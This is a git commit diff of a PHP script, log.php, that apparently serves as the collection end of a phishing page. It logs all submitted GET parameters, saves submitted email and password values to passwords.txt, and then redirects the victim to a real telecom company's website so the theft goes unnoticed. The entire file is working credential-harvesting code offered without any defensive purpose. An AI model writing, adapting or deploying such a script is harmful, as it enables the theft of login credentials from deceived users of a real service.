092b84bc0c2fd531995f81a3818d4cb8b65e6cc1
hackman2 <30339823+hackman2@users.noreply.github.com>
2017-07-21 13:57:09 +0200

    Alternate approach to log.php
    All data from $get is stored in seperate log.log file. Username and password is then stored in passwords.txt.

--- log.php
+++ log.php
@@ -1,13 +1,26 @@
 <?php
+
 header("Location: http://www.tusass.gl ");
-$handle = fopen("passwords.txt", "a");
+
+$log_handler = fopen("logs.log", "a");
+$credentials_handler = fopen("passwords.txt", "a");
+
 foreach($_GET as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
+    fwrite($log_handler, "$variable=$value\r\n");
+
+    if ($variable == "email") {
+        fwrite($credentials_handler, "email='$value'\r\n");
+    }
+    elseif ($variable == "pass") {
+        fwrite($credentials_handler, "pass='$value'\r\n");
+    }
 }
-fwrite($handle, "\r\n");
-fclose($handle);
+
+fwrite($log_handler, "----\r\n");
+fwrite($credentials_handler, "----\r\n");
+
+fclose($log_handler);
+fclose($credentials_handler);
+
 exit;
 ?> 
